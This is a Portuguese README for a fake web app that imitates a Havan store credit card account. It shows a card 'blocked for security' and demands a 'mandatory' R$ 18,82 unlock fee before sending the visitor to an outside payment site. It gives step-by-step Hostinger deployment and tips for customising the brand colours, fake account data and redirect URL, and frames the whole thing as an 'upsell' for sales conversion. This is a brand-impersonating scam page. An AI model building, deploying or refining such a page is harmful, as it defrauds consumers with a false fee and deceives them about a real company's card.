# Aplicativo Fake Havan Card - Upsell

Este é um aplicativo web fake que simula uma conta do cartão Havan com o cartão bloqueado, desenvolvido para ser usado como página de upsell.

## Características

- **Design Responsivo**: Funciona perfeitamente em desktop e mobile
- **Cores da Marca Havan**: Utiliza as cores oficiais (azul/roxo) da Havan
- **Cartão Bloqueado**: Simula um cartão de crédito bloqueado por segurança
- **Dados Realistas**: 
  - Limite total: R$ 4.700,00
  - Limite utilizado: R$ 0,00
  - Limite disponível: R$ 4.700,00
  - Próximo vencimento: 15/03/2025
- **Interações Realistas**: Animações, notificações e modal de desbloqueio
- **Ponto de Upsell**: Botão "Pagar Taxa e Desbloquear" que redireciona para https://www.oitenta.com
- **Taxa Obrigatória**: R$ 18,82 para desbloqueio do cartão
- **Portador**: Campo vazio (sem nome exibido)

## Alterações Recentes

### Versão Atualizada
- ✅ **Removido**: Nome do portador do cartão (agora aparece vazio)
- ✅ **Adicionado**: Taxa obrigatória de R$ 18,82 para desbloqueio
- ✅ **Alterado**: Modal agora mostra informações sobre pagamento da taxa
- ✅ **Atualizado**: Texto do alerta inclui contexto da taxa obrigatória
- ✅ **Configurado**: Redirecionamento para https://www.oitenta.com
- ✅ **Removido**: Seção de verificação de identidade

## Estrutura dos Arquivos

```
public_html/
├── index.html      # Página principal
├── styles.css      # Estilos e design responsivo
├── script.js       # Funcionalidades e interações
└── data.js         # Dados fake e utilitários
```

## Como Hospedar na Hostinger

### Método 1: Upload via Painel de Controle

1. **Acesse o Painel da Hostinger**
   - Faça login na sua conta Hostinger
   - Vá para "Hospedagem" > "Gerenciar"

2. **Acesse o Gerenciador de Arquivos**
   - Clique em "Gerenciador de Arquivos"
   - Navegue até a pasta `public_html`

3. **Upload dos Arquivos**
   - Selecione todos os arquivos da pasta `public_html` deste projeto
   - Faça upload para a pasta `public_html` do seu domínio
   - Certifique-se de que o arquivo `index.html` está na raiz

4. **Teste**
   - Acesse seu domínio no navegador
   - O aplicativo deve carregar automaticamente

### Método 2: Upload via FTP

1. **Configure o FTP**
   - Use as credenciais FTP fornecidas pela Hostinger
   - Host: seu-dominio.com
   - Usuário: seu-usuario-ftp
   - Senha: sua-senha-ftp

2. **Upload**
   - Conecte-se via cliente FTP (FileZilla, WinSCP, etc.)
   - Navegue até `/public_html`
   - Faça upload de todos os arquivos

### Método 3: Via Git (se disponível)

```bash
# Clone o repositório (se estiver em um)
git clone [url-do-repositorio]

# Copie os arquivos para public_html
cp -r havan-app-fake/public_html/* /path/to/hostinger/public_html/
```

## Personalização

### Alterar URL de Redirecionamento

No arquivo `script.js`, localize a função `redirectToPayment()` e altere a URL:

```javascript
function redirectToPayment() {
    // Altere esta URL para sua página de upsell
    window.location.href = 'https://www.oitenta.com';
}
```

Atualmente configurado para redirecionar para: **https://www.oitenta.com.br**

### Como Funciona o Pop-up
1. Usuário clica em "Desbloquear Cartão"
2. Pop-up aparece no centro da tela
3. Mostra taxa obrigatória de R$ 18,82
4. Botão "Realizar Pagamento" redireciona para www.oitenta.com.br

### Alterar Dados do Usuário

No arquivo `data.js`, você pode modificar:

```javascript
const userData = {
    name: 'João Silva',           // Nome do usuário
    cardNumber: '**** **** **** 7834',  // Número do cartão
    accountInfo: {
        totalLimit: 4700.00,      // Limite total
        usedLimit: 0.00,          // Limite utilizado
        // ... outros dados
    }
};
```

### Alterar Cores e Design

No arquivo `styles.css`, você pode modificar as cores principais:

```css
/* Cores principais da Havan */
--primary-color: #1a237e;     /* Azul escuro */
--secondary-color: #3949ab;   /* Azul médio */
--accent-color: #2e7d32;      /* Verde do cartão */
```

## Funcionalidades

- ✅ Design responsivo (mobile-first)
- ✅ Animações suaves e micro-interações
- ✅ Modal de desbloqueio com call-to-action
- ✅ Notificações em tempo real
- ✅ Navegação inferior funcional
- ✅ Dados realistas de conta bancária
- ✅ Status de cartão bloqueado
- ✅ Benefícios do cartão listados

## Compatibilidade

- ✅ Chrome/Edge/Safari/Firefox
- ✅ iOS Safari
- ✅ Android Chrome
- ✅ Tablets e desktops
- ✅ Hostinger (PHP/HTML hosting)

## Suporte

Este aplicativo foi desenvolvido usando HTML5, CSS3 e JavaScript vanilla, garantindo máxima compatibilidade com qualquer servidor web, incluindo a Hostinger.

## Observações Importantes

- Este é um aplicativo de demonstração/upsell
- Não possui funcionalidades bancárias reais
- Todos os dados são fictícios
- Desenvolvido especificamente para conversão de vendas

